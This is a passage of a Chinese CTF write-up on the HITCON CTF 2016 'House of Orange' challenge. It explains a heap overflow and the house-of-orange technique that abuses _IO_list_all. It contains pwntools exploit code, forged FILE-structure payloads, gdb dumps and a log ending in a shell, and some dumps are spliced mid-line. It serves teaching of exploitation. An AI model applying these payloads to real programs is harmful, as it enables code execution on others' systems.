| 0x000011f4 pop rbx
| 0x000011f5 pop rbp
\ 0x000011f6 ret
Upgrade 最多可以进行 3 次，当确认 house 存在后，就直接在 orange->name 的
地方读入长度为 length 的 name，然后读入新的 price 和 color。新的 length 同样
来自用户输入，如果大于 0x1000，则按照 0x1000 处理。
这里的问题在于程序没有将新 length 与旧 length 做任何比较，如果新 length 大于
旧 length，那么将导致堆溢出。
漏洞利用
和常见的堆利用题目不同的是，这题只有 malloc 而没有 free，于是很多利用方法
都用不了。当然这题是独创了一种 house-of-orange 的利用方法，这种方法利用堆
溢出修改 _IO_list_all 结构体，从而改变程序流，前提是能够泄漏堆和 libc，
泄露的方法是触发位于 sysmalloc() 中的 _int_free() 将 top chunk 释放到
unsorted bin 中（详细内容参考章节 3.1.8 和 4.13）。
overwrite top chunk
1343
6.1.24 pwn HITCONCTF2016 House_of_Orange
def overwrite_top():
build(0x10, 'AAAA')
payload = "A" * 0x30
payload += p64(0) + p64(0xfa1) # top chunk header
upgrade(0x41, payload)
第一步，覆盖 top chunk 的 size 域，以触发 sysmalloc() 。创建第一个
house：
gdb-peda$ x/16gx 0x555555758010-0x10
0x555555758000: 0x0000000000000000 0x0000000000000021 fd_nextsize = victim->bk_nextsize = vict
im;
所以这里我们通过修改 name 即可泄露出 heap 地址：
1348
6.1.24 pwn HITCONCTF2016 House_of_Orange
gdb-peda$ x/32gx 0x555555758010-0x10
0x555555758000: 0x0000000000000000 0x0000000000000021
0x555555758010: 0x0000555555758050 0x0000555555758030
0x555555758020: 0x0000000000000000 0x0000000000000021
0x555555758030: 0x4141414141414141 0x4141414141414141
0x555555758040: 0x4141414141414141 0x4141414141414141
0x555555758050: 0x0000001f00000001 0x4141414141414141
0x555555758060: 0x0000000000000000 0x0000000000000021
0x555555758070: 0x0000555555758090 0x0000555555779010
0x555555758080: 0x0000000000000000 0x0000000000000021
0x555555758090: 0x0000001f00000001 0x0000000000000000
0x5555557580a0: 0x0000000000000000 0x0000000000000021 _wide_data
stream = stream.ljust(0xc0, '\x00')
stream += p64(1) # fp->_mode
payload = "A" * 0x420
payload += stream
payload += p64(0) * 2
payload += p64(vtable_addr) # _IO_FILE_plus->vta
ble
payload += p64(1) # fp->_wide_data->_I
O_write_base
payload += p64(2) # fp->_wide_data->_I
O_write_ptr
payload += p64(system_addr) # vtable __overflow
upgrade(0x600, payload)
现在我们有了 libc 和 heap 地址，接下来就是真正的 house-of-orange，相信你已
经看了参考章节，这里就不再重复了。结果如下：
1350
6.1.24 pwn HITCONCTF2016 House_of_Orange
gdb-peda$ x/36gx 0x5555557580c0+0x410
0x5555557584d0: 0x4141414141414141 0x4141414141414141
0x5555557584e0: 0x0000001f00000001 0x4141414141414141
0x5555557584f0: 0x0068732f6e69622f 0x0000000000000060 
__libc_message -> __GI_abort -> _IO_flush_all_lockp 。
开启 ASLR，Bingo!!!
1351
6.1.24 pwn HITCONCTF2016 House_of_Orange
$ python exp.py
[+] Starting local process './houseoforange': pid 6219
[*] libc_base address: 0x7f02ae6d9000
[*] heap address: 0x5575b74a2000
[*] _IO_list_all address: 0x7f02aea9d520
[*] system address: 0x7f02ae71e380
[*] vtable address: 0x5575b74a25c8
[*] Switching to interactive mode
*** Error in `./houseoforange': malloc(): memory corruption: 0x0
0007f02aea9d520 ***
======= Backtrace: =========
...
$ whoami
firmy
exploit
完整的 exp 如下：
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
io = process(['./houseoforange'], env={'LD_PRELOAD':'./libc-2.23
.so'})
libc = ELF('libc-2.23.so')
def build(size, name):
io.sendlineafter("Your choice : ", '1')
io.sendlineafter("Length of name :", str(size))
io.sendlineafter("Name :", name)
io.sendlineafter("Price of Orange:", '1')
io.sendlineafter("Color of Orange:", '1')
def see():
io.sendlineafter("Your choice : ", '2')
1352
6.1.24 pwn HITCONCTF2016 House_of_Orange
data = io.recvuntil('\nPrice', drop=True)[-6:].ljust(8, '\x0
0')
return data
def upgrade(size, name):
io.sendlineafter("Your choice : ", '3')
io.sendlineafter("Length of name :", str(size))
io.sendlineafter("Name:", name)
io.sendlineafter("Price of Orange:", '1')
io.sendlineafter("Color of Orange:", '1')
def overwrite_top():
build(0x10, 'AAAA')
payload = "A" * 0x30
payload += p64(0) + p64(0xfa1) # top chunk header
upgrade(0x41, payload)
def leak_libc():
global libc_base
build(0x1000, 'AAAA') # _int_free in sysmalloc
build(0x400, 'A' * 7) # large chunk